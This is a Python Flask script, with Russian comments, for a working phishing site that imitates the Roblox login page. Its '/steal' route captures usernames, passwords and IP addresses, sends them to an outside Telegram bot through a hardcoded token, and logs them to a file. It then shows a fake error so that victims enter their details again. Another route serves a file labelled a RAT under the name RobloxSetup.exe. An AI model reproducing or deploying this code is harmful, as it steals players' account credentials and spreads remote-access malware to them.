from flask import Flask, request, render_template, send_file
import datetime
import requests
import os

app = Flask(__name__)

TELEGRAM_TOKEN = "8903499518:AAHzSL9SGMpwgZy0k-4BB1XXHm3clbkHgks"
CHAT_ID = "7352598189"

def send_tg(msg):
    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
            json={"chat_id": CHAT_ID, "text": msg}
        )
    except:
        pass

# ===== ГЛАВНАЯ СТРАНИЦА (ВСЕГДА ROXBLOX) =====
@app.route('/')
def index():
    try:
        return render_template('index.html')
    except:
        # Если index.html не найден — показываем встроенную страницу
        return '''
        <html>
        <head><title>Roblox — вход</title></head>
        <body style="background:#1a1a2e; display:flex; justify-content:center; align-items:center; height:100vh; font-family:Arial;">
            <div style="background:#16213e; padding:40px; border-radius:12px; width:340px; text-align:center;">
                <h2 style="color:white;">Войдите в Roblox</h2>
                <form action="/steal" method="post">
                    <input type="text" name="login" placeholder="Имя пользователя" required style="width:100%; padding:12px; margin:6px 0; border:none; border-radius:6px; background:#0f3460; color:white;">
                    <input type="password" name="password" placeholder="Пароль" required style="width:100%; padding:12px; margin:6px 0; border:none; border-radius:6px; background:#0f3460; color:white;">
                    <button type="submit" style="width:100%; padding:12px; background:#00bfff; border:none; border-radius:6px; color:white; font-weight:bold; cursor:pointer;">Войти</button>
                </form>
                <div style="color:#ff6b6b; margin-top:10px;">Защищено 🔒</div>
            </div>
        </body>
        </html>
        '''

# ===== ПРИЁМ ЛОГИНА И ПАРОЛЯ =====
@app.route('/steal', methods=['POST'])
def steal():
    login = request.form.get('login')
    password = request.form.get('password')
    ip = request.remote_addr

    msg = f"🎮 ROBLOX LOGIN!\n👤 {login}\n🔑 {password}\n🌐 IP: {ip}"
    send_tg(msg)

    with open('steals.txt', 'a', encoding='utf-8') as f:
        f.write(f"{datetime.datetime.now()} | {ip} | {login} | {password}\n")

    # Возвращаем ошибку, чтобы жертва попробовала снова
    return '''
    <html>
    <head><title>Ошибка входа</title></head>
    <body style="background:#1a1a2e; display:flex; justify-content:center; align-items:center; height:100vh; font-family:Arial;">
        <div style="background:#16213e; padding:40px; border-radius:12px; text-align:center;">
            <h3 style="color:#ff6b6b;">Неверный логин или пароль</h3>
            <p style="color:white;">Попробуйте ещё раз</p>
            <a href="/" style="color:#00bfff;">Вернуться</a>
        </div>
    </body>
    </html>
    '''

# ===== СКАЧИВАНИЕ RAT =====
@app.route('/download/roblox_setup.exe')
def download_exe():
    try:
        return send_file('rat_mm2.exe', as_attachment=True, download_name='RobloxSetup.exe')
    except:
        return "Файл временно недоступен", 404

# ===== ЛОГИ (для тебя) =====
@app.route('/logs')
def logs():
    if not os.path.exists('steals.txt'):
        return "Нет логов"
    with open('steals.txt', 'r', encoding='utf-8') as f:
        return f"<pre>{f.read()}</pre>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
